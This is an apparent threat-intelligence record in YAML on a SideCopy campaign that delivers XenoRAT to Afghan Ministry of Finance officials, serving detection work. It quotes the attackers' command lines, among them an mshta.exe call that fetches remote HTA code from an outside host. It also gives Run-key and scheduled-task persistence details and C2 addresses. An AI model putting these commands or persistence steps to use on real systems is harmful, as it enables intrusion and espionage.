title: 'Operation XENOFISCAL: SideCopy APT Targets Afghan Ministry of Finance with
  XenoRAT'
description: A Pakistan-linked SideCopy APT campaign delivers XenoRAT 1.8.7 to Afghan
  Ministry of Finance officials via spear phishing ZIP archives containing malicious
  LNK files, using mshta.exe LOLBin abuse, multi-stage HTA/JavaScript loaders, .NET
  deserialization, and registry-based persistence.
attribution: SideCopy
malware_families:
- XenoRAT
cves: []
ttps:
  processes:
  - mshta.exe
  - cmd.exe
  - schtasks.exe
  command_lines:
  - cmd /C start C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
  - cmd.exe /c start C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
  - /C choice /C Y /N /D Y /T 3 & Del
  - \Windows\System32\mshta.exe https://abing.edu.s1/L3STICue/CTondTya/nden.PN
  powershell: []
  scripts:
  - zuidrt.hta
  - noway.bat
  - ugayt.hta
  - Bugayt.hta
  registry_keys:
  - HKLM\SOFTWARE\Microsoft\.NETFramework\v4.0.30319
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  image_loads:
  - clr.dll
  - mscoree.dll
  - WayBroad.dll
  - Aotestpass.dll
  network_connections:
  - mshta.exe -> abimj[.]edu[.]af:443
  - XenoRAT -> 185.235.137[.]106:443
  - mshta.exe -> abing.edu.s1:443
  file_activity:
  - C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
  - ayhui.vmxx
  persistence:
  - Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) with value
    name Edgre executing cmd /C start C:\Users\Public\USOShared-1de48789-1285\zuidrt.hta
  - Batch file noway.bat written to user temp directory and executed via hidden process
    to establish HTA persistence
  - Scheduled Task named XenoUpdateManager created via schtasks.exe to run executable
    at user login with highest privileges
  - Registry Run key at HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute
    payload at login without admin rights
  - Registry Run Keys / Startup Folder (T1547.001)
  - Scheduled Task (T1053.005)
  process_relations:
  - LNK -> mshta.exe
  - cmd.exe -> mshta.exe
  - mshta.exe -> cmd.exe
